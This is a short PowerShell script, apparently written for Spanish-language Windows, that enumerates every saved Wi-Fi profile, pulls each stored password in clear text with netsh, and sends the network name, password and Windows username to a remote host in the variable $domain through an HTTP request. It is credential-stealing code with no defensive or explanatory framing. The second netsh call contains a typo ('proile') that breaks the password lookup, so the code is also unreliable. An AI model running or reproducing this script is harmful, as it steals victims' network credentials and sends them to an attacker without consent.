netsh wlan show profile | Select-String '(?<=Perfil de todos los usuarios\s+:\s).+' | ForEach-Object {
	$wlan = $_.Matches.Value
	$pass = netsh wlan show proile $wlan key=clear | Select-String '(?<=Contenido de la clave\s+:\s).+'

	Invoke-RestMethod -Uri "$domain/username=$env:username&password=$pass&wlan=$wlan" -Method GET

}
